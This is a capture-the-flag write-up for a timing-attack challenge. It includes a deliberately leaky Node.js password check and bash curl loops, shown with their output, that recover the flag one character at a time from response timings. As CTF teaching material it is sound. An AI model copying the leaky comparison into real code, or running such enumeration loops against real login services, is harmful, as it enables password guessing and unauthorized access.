---
title: Timing Attack
date: 2017-02-26 10:57 UTC
tags:
  - ctf
  - misc 
  - introductory
  - web
---

Once upon a time, there was a programmer. His name was Anshul. He did not know how to work with passwords. His friend Animesh took this opportunity to do jugaad and guess the passwords so that he is able to order a lot of free shirts from MustCapture. Help Animesh to find this password.

hostname: defunct

- Category: #misc

- Flag Format: r/[a-zA-Z]+/

- link: defunct

Provided [server.js](2017-02-26-timing-attack/server.js)

~~~ js
const http = require('http');

const flag = "kyouko";

server = http.createServer();

server.on('request', function(request, response) {
    if (request.headers['password'] == undefined) { 
        response.end('Could Not Find "password" header');
    }

    var password = request.headers['password'] || '';

    var time = 0;

    for (var i = password.length - 1; i >= 0; i--) {
        if (flag[i] == undefined) {
            time = Math.random();
            break;
        } else if (flag[i] == password[i]) {
            time += Math.random() + 1.2;
        } else {
            break;
        }
    }

    time += Math.random();

    if (password == flag) {
        response.end('flag: kyouko');
    } else {
        response.end('Time taken: ' + time);
    }
});

server.listen(8090);
~~~

Solution
========

We are given a regex format for the flag. The regex quite literally means that there the flag is alphabets (upper or lower case) which are repeating, and is a single word.

We are given a URL to mess with, and we do the preliminary task of scanning what is up.

	$ curl ctfclubiiit.tk:8080 -v
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:11:57 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Could Not Find "password" header

So it seems that the question requires a Header Password, so we make a guess with a password, as good as any...

	$ curl ctfclubiiit.tk:8080 -v -H password:password
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:password
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:12:32 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8570860189920093

So that is a interesting response. It gives out a time taken entry. The question seems to point to a single word flag, and we could do a brute force. Let us try with all single characters.

	$ for i in {a..z} {A..Z}
	do
	curl -s ctfclubiiit.tk:8080 -H password:$i -v
	done
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:a
	> 
	...
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.18704188948235467* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:k
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:15 GMT
	< Content-Length: 30
	< Connection: keep-alive
	...
	Time taken: 0.12415661205233341* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:z
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:21 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9517626449710153* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:A
	...
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5161103718919255* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:Y
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:32 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.786562176526157* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:Z
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:33 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.46817110473251855%


This one entry in particular stands out. 

	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:k
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:15 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 1.7484813706349838* Rebuilt URL to: ctfclubiiit.tk:8080/

The time taken for password:k is inordinately larger than the time taken for other strings. We might be onto something here. 

	$ for i in k{a..z} k{A..Z}
	do
	curl -s ctfclubiiit.tk:8080 -H password:$i -v
	done
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ka
	> 
	...
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:17 GMT
	< Content-Length: 28
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.71633441394593* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ky
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:17 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 3.174663165603297* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	...
	Time taken: 0.48192739215973557* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kZ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:29 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7032416484348676%  

And here we again find another match. The entry for password:ky is inordinately larger than the others. It does not take long now, and soon we get to this point.

	$ for i in kyouk{a..z} kyouk{A..Z}
	do
	curl -s ctfclubiiit.tk:8080 -H password:$i -v
	done
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouka
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:09 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	...
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.13992585055199513* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouko
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:15 GMT
	< Content-Length: 12
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	flag: kyouko* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukp
	> 
	...
	Time taken: 0.8287232987409219* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukZ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:32 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3412310248097701% 

We are rewarded for our efforts with this. 

	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouko
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:15 GMT
	< Content-Length: 12
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	flag: kyouko* Rebuilt URL to: ctfclubiiit.tk:8080/

Flag
====

kyouko
